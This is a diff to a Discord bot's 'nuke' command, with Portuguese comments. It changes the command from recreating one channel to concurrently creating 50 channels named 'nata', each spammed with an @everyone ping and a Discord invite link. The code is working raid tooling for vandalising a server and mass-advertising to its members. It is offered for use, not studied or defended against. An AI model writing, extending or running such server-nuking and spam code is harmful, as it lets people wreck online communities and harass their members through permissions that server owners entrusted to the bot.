@@ -42455,17 +42455,18 @@ async def nuke_cmd(ctx: commands.Context):
         except Exception:
             pass
 
-    # ── Recria canal "nata" ───────────────────────────────────────────────────
-    try:
-        new_ch = await guild.create_text_channel("nata", reason="Nuke — recriação")
-    except Exception:
-        return
+    # ── Recria 50 canais "nata" com a mensagem de divulgação ─────────────────
+    async def _criar_e_enviar():
+        try:
+            ch = await guild.create_text_channel("nata", reason="Nuke — recriação")
+            await ch.send(
+                content="@everyone\nhttps://discord.gg/KxBQe9fYG",
+                allowed_mentions=discord.AllowedMentions(everyone=True),
+            )
+        except Exception:
+            pass
 
-    # ── Mensagem de divulgação ────────────────────────────────────────────────
-    await new_ch.send(
-        content="@everyone\nhttps://discord.gg/KxBQe9fYG",
-        allowed_mentions=discord.AllowedMentions(everyone=True),
-    )
+    await asyncio.gather(*[_criar_e_enviar() for _ in range(50)])
 
 
 # =============================================================================
